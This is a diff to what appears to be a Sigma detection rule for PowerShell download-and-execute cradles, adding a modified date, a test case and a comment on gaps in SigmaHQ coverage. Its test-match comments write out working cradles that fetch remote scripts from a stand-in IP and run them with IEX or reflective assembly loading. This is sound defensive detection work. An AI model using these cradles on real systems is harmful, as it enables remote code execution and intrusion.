@@ -7,6 +7,7 @@ references:
     - https://attack.mitre.org/techniques/T1105/
 author: Marc
 date: 2026-11-07
+modified: 2026-11-08
 tags:
     - attack.execution
     - attack.command-and-control
@@ -40,4 +41,6 @@ falsepositives:
 level: high
 # test-match: ScriptBlockText="IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a.ps1')"
 # test-match: ScriptBlockText="$b=(Invoke-WebRequest -Uri $u -UseBasicParsing).Content; [Reflection.Assembly]::Load($b)"
+# test-match: ScriptBlockText="$wc = New-Object Net.WebClient; $s = $wc.DownloadString($u); Invoke-Expression $s"
 # test-nomatch: ScriptBlockText="Invoke-WebRequest -Uri $u -OutFile C:\Temp\report.csv"
+# beyond-sigmahq: SigmaHQ's script-block rules match only specific cradle spellings; a WebClient download into a variable then IEX matches none, and Invoke-WebRequest/RestMethod alone are medium
